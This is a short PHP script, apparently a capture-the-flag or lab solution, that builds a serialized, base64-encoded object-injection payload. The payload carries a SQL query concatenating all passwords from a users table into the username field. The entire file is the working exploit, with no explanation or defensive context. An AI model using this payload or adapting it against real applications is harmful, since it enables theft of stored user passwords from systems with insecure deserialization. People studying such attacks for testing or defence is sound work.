<?php

class SQL {
    public $query;
    public $conn;

    public function __construct($query) {
        $this->query = $query;
    }
}

$injection = new SQL("SELECT GROUP_CONCAT(password) AS username FROM users;");
echo base64_encode(serialize($injection)) . "\n";

?>